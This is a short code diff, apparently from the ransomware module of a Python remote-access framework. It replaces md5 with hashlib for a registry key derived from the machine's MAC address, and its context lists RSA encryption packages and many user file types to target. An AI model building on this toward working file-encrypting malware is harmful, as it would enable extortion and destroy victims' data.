@@ -5,10 +5,10 @@
 # standard library
 import os
 import sys
-import md5
 import time
 import Queue
 import base64
+import hashlib
 import StringIO
 
 # packages
@@ -26,7 +26,7 @@ packages = ['_winreg','Cryptodome.PublicKey.RSA','Cryptodome.Cipher.PKCS1_OAEP']
 platforms = ['win32']
 threads = {}
 tasks = Queue.Queue()
-registry_key = md5.new(util.mac_address()).hexdigest()
+registry_key = hashlib.md5(util.mac_address()).hexdigest()
 filetypes = ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg',
 	     '.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc',
              '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx',
